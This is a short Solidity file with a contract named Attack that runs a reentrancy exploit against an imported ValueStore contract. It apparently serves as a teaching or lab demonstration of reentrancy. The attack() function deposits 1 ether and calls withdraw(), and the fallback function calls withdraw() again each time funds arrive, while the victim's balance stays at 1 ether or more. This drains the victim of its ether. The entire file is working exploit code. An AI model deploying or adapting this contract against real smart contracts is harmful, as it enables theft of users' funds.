// SPDX-License-Identifier: Apache-2.0
pragma solidity ^0.8.15;

import "./ValueStore.sol";

contract Attack {
    ValueStore private v;

    constructor(address vStoreAddress) {
        v = ValueStore(vStoreAddress);
    }

    fallback() external payable {
        if (address(v).balance >= 1 ether) {
            v.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        v.deposit{value: 1 ether}();
        v.withdraw();
    }

    function getBalance() public view returns (uint256 amount) {
        amount = address(this).balance;
    }
}
